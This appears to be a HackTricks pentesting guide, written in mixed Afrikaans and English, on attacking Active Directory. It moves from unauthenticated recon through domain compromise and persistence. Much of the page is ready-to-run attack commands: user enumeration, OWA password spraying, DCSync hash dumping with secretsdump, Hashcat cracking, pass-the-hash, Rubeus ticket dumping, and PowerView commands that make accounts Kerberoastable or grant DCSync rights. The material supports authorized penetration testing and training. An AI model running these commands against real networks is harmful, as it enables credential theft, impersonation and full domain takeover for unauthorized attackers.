# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n fundamentele tegnologie, wat **network administrators** in staat stel om doeltreffend **domains**, **users**, en **objects** binne ’n netwerk te skep en te bestuur. Dit is ontwerp om te skaal, en fasiliteer die organisering van ’n groot aantal users in hanteerbare **groups** en **subgroups**, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domains**, **trees**, en **forests**. ’n **domain** omvat ’n versameling objects, soos **users** of **devices**, wat ’n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domains wat deur ’n gedeelde struktuur gekoppel is, en ’n **forest** verteenwoordig die versameling van verskeie trees, onderling verbind deur **trust relationships**, en vorm die boonste laag van die organisasiestruktuur. Spesifieke **access**- en **communication rights** kan op elkeen van hierdie vlakke toegewys word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting wat met Active Directory objects verband hou.
2. **Object** – Dui entiteite binne die directory aan, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as ’n houer vir directory objects, met die vermoë dat veelvuldige domains binne ’n **forest** kan saambestaan, elk met sy eie object-versameling.
4. **Tree** – ’n Groepering van domains wat ’n gemeenskaplike root domain deel.
5. **Forest** – Die toppunt van organisasiestruktuur in Active Directory, bestaande uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat krities is vir die gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Sentreer databerging en bestuur interaksies tussen **users** en **domains**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled applications deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on**-vermoëns om users oor verskeie web applications in ’n enkele sessie te autentiseer.
5. **Rights Management** – Help om copyright-materiaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir ’n meer gedetailleerde verduideliking, kyk: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om **attack an AD** te **understand**, moet jy die **Kerberos authentication process** baie goed **understand**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie servers in die netwerk gevind het, kan jy ook **user enumeration teen dit** uitvoer. Byvoorbeeld, jy kan die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, jy should have die **name of the people working on the company** from the recon stap you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so jy know jy have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that jy can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If jy have managed to enumerate the active directory jy will have **more emails and a better understanding of the network**. Jy might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: **`workspace create <name>`** spawns per-protocol SQLite DBs under **`~/.nxc/workspaces/<name>`** (smb/mssql/winrm/ldap/etc). Switch views with **`proto smb|mssql|winrm`** and list gathered secrets with **`creds`**. Manually purge sensitive data when done: **`rm -rf ~/.nxc/workspaces/<name>`**.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing **`(signing:False)`** are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay na die DC geblokkeer** is deur signing, toets steeds die **LDAP**-postuur: `netexec ldap <dc>` beklemtoon `(signing:None)` / swak channel binding. ’n DC met SMB signing vereis maar LDAP signing gedeaktiveer bly ’n geldige **relay-to-LDAP** teiken vir abuses soos **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs **embed** soms gemaskeerde admin-wagwoorde in HTML. Deur source/devtools te bekyk kan cleartext blootstel (bv. `<input value="<password>">`), wat Basic-auth toegang toelaat om scan/print repositories te deursoek.
- Retrieved print jobs kan **plaintext onboarding docs** met per-user wagwoorde bevat. Hou pairings in lyn wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Gebruik shucking wanneer:

- Jy ’n NT-korpus van DCSync, SAM/SECURITY dumps, of credential vaults het en hergebruik in ander domains/forests wil toets.
- Jy RC4-gebaseerde Kerberos-materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-responses, of DCC/DCC2-blobs vasvang.
- Jy vinnig hergebruik vir lang, onkrakbare passphrases wil bewys en onmiddellik via Pass-the-Hash wil pivot.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy die **credentials of a session of a valid domain account** gekompromitteer het. As jy geldige credentials of ’n shell as ’n domain user het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander users te kompromitteer**.

Voordat jy die geverifieerde enumerasie begin, moet jy weet wat die **Kerberos double hop problem** is.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om ’n account te kompromitteer is ’n **groot stap om die hele domain te begin kompromitteer**, omdat jy dan die **Active Directory Enumeration** kan begin:

Wat [**ASREPRoast**](asreproast.md) betref, kan jy nou elke moontlike vulnerable user vind, en wat [**Password Spraying**](password-spraying.md) betref, kan jy ’n **lys van al die usernames** kry en die password van die gekompromitteerde account, empty passwords en nuwe belowende passwords probeer.

- Jy could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om al die domain usernames van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumeration-afdeling klein, is dit die belangrikste deel van alles. Gaan na die links (hoofsaaklik die een van cmd, powershell, powerview en BloodHound), leer hoe om ’n domain te enumerate en oefen totdat jy gemaklik voel. Tydens ’n assessment sal dit die sleutelmoment wees om jou weg na DA te vind of om te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur services gebruik word wat aan user accounts gekoppel is, en die cracking van hul encryption—wat op user passwords gebaseer is—**offline**.

Meer hieroor in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy ’n paar credentials bekom het, kan jy kyk of jy toegang tot enige **machine** het. Vir daardie doel kan jy **CrackMapExec** gebruik om te probeer koppel aan verskeie servers met verskillende protocols, volgens jou port scans.

### Local Privilege Escalation

As jy credentials of ’n session as ’n gewone domain user gekompromitteer het en jy **access** het met hierdie user tot **enige machine in die domain**, moet jy probeer om jou weg te vind om **privileges locally te escalate en te looting for credentials**. Dit is omdat slegs met local administrator privileges jy in staat sal wees om **hashes van ander users** in memory (LSASS) en locally (SAM) te **dump**.

Daar is ’n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**checklist**](../checklist-windows-privilege-escalation.md). Ook, moenie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die current user sal vind wat jou toestemming gee om onverwags resources te access, maar jy kan kyk:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy die active directory suksesvol opgetel het, sal jy **meer e-posse en ’n beter begrip van die netwerk** hê. Jy kan dalk NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** afdwing.**

### Soek vir Creds in Computer Shares | SMB Shares

Nou dat jy ’n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is ’n baie vervelige, herhalende taak (en selfs meer as jy honderde docs vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy toegang tot ander PCs of shares het, kan jy **lêers plaas** (soos ’n SCF file) wat, as dit op een of ander manier verkry word, ’n NTLM authentication teen jou sal **trigger** sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie vulnerability het enige geauthentiseerde user toegelaat om die **domain controller te compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation op Active Directory MET privileged credentials/session

**Vir die volgende techniques is ’n gewone domain user nie genoeg nie; jy het spesiale privileges/credentials nodig om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om ’n **local admin** account te **compromise** met behulp van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in memory en plaaslik te dump.\
[**Lees hierdie page oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van ’n user het**, kan jy dit gebruik om hom te **impersonate**.\
Jy moet ’n **tool** gebruik wat die **NTLM authentication using** daardie **hash** sal **perform**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** **inject**, sodat wanneer enige **NTLM authentication** uitgevoer word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie page vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack poog om die **user NTLM hash te use om Kerberos tickets aan te vra**, as ’n alternatief vir die gewone Pass The Hash oor die NTLM protocol. Daarom kan dit veral **nuttig wees in networks waar die NTLM protocol disabled is** en slegs **Kerberos toegelaat word** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** attack method, steel attackers ’n user se authentication ticket in plaas van hul password of hash values. Hierdie gesteelde ticket word dan gebruik om die **user te impersonate**, en verkry ongemagtigde toegang tot resources en services binne ’n network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van ’n **local administrato**r het, moet jy probeer om **plaaslik aan te meld** by ander **PCs** daarmee.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit nogal **noisy** is en **LAPS** dit sou **mitigeer**.

### MSSQL Abuse & Trusted Links

As ’n gebruiker **toegang tot MSSQL instances** het, kan hy dit dalk gebruik om **commands uit te voer** op die MSSQL host (indien dit as SA loop), die NetNTLM **hash te steel** of selfs ’n **relay** **attack** uit te voer.\
Ook, as ’n MSSQL instance deur ’n ander MSSQL instance vertrou word (database link). As die gebruiker **privileges** oor die trusted database het, gaan hy in staat wees om **die trust relationship te gebruik om queries ook in die ander instance uit te voer**. Hierdie trusts kan geketting word en op ’n stadium kan die gebruiker dalk ’n misconfigured database vind waar hy commands kan uitvoer.\
**Die links tussen databases werk selfs oor forest trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Derdeparty inventory en deployment suites stel dikwels kragtige roetes na credentials en code execution bloot. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer object met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en jy het domain privileges op die rekenaar, sal jy in staat wees om TGTs uit memory te dump van elke user wat op die rekenaar inlogin.\
Dus, as ’n **Domain Admin op die rekenaar inlogin**, sal jy sy TGT kan dump en hom impersonate deur [Pass the Ticket](pass-the-ticket.md) te gebruik.\
Danksy constrained delegation kan jy selfs **outomaties ’n Print Server kompromitteer** (hopelik sal dit ’n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As ’n user of computer toegelaat word vir "Constrained Delegation" sal dit in staat wees om **enige user te impersonate om toegang tot sekere services in ’n computer te kry**.\
Dan, as jy die **hash van hierdie user/computer kompromitteer** sal jy in staat wees om **enige user te impersonate** (selfs domain admins) om toegang tot sekere services te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Deur **WRITE** privilege op ’n Active Directory object van ’n remote computer te hê, kan code execution met **elevated privileges** bereik word:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die compromised user kan sekere **interessante privileges oor sommige domain objects** hê wat jou kan laat **lateraal beweeg**/**privileges eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Die ontdekking van ’n **Spool service wat luister** binne die domain kan **misbruik** word om **nuwe credentials te verkry** en **privileges te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander users** toegang kry tot die **compromised** machine, is dit moontlik om **credentials uit memory te versamel** en selfs **beacons in hul processes in te spuit** om hulle te impersonate.\
Gewoonlik sal users via RDP toegang tot die system kry, so hier het jy hoe om ’n paar attacks oor third party RDP sessions uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied ’n system vir die bestuur van die **local Administrator password** op domain-joined computers, en verseker dat dit **randomized**, uniek en gereeld **verander** word. Hierdie passwords word in Active Directory gestoor en toegang word via ACLs beheer tot slegs geautoriseerde users. Met genoegsame privileges om toegang tot hierdie passwords te kry, word pivoting na ander computers moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Die versamel van certificates** vanaf die compromised machine kan ’n manier wees om privileges binne die environment te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **vulnerable templates** gekonfigureer is, is dit moontlik om dit te misbruik om privileges te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin** of selfs beter **Enterprise Admin** privileges kry, kan jy die **domain database** dump: _ntds.dit_.

[**Meer inligting oor die DCSync attack kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Byvoorbeeld, jy kan:

- Maak users kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak users kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Gee [**DCSync**](#dcsync) privileges aan ’n user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep ’n **legitimate Ticket Granting Service (TGS) ticket** vir ’n spesifieke service deur die **NTLM hash** te gebruik (byvoorbeeld die **hash van die PC account**). Hierdie metode word gebruik om **toegang tot die service privileges** te verkry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

’n **Golden Ticket attack** behels dat ’n attacker toegang kry tot die **NTLM hash van die krbtgt account** in ’n Active Directory (AD) environment. Hierdie account is spesiaal omdat dit gebruik word om al die **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir authentication binne die AD network.

Sodra die attacker hierdie hash verkry, kan hy **TGTs** vir enige account wat hy kies skep (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soos golden tickets wat op ’n manier forged word wat **common golden tickets detection mechanisms omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om certificates van ’n account te hê of om dit te kan request** is ’n baie goeie manier om in die user account te kan persist (selfs as hy die password verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Om certificates te gebruik is ook moontlik om met hoë privileges binne die domain te persist:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

